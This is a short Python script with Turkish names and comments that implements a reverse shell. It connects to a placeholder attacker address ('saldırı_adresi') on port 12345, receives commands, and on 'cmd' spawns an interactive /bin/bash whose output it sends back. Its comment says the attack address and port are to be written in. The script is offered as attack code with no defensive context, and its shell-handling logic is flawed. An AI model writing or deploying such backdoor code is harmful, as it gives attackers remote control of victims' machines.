import socket
import subprocess

def baglan():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('saldırı_adresi', 12345)) # Saldırı adresi ve port numarası buraya yazılacak
        while True:
            komut = s.recv(1024).decode()
            if 'exit' in komut:
                s.close()
                break
            elif 'cmd' in komut:
                d = subprocess.Popen(["/bin/bash", "-i"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                cikti = d.stdout.read() + d.stderr.read()
                s.send(cikti)
    except Exception as e:
        pass

baglan()
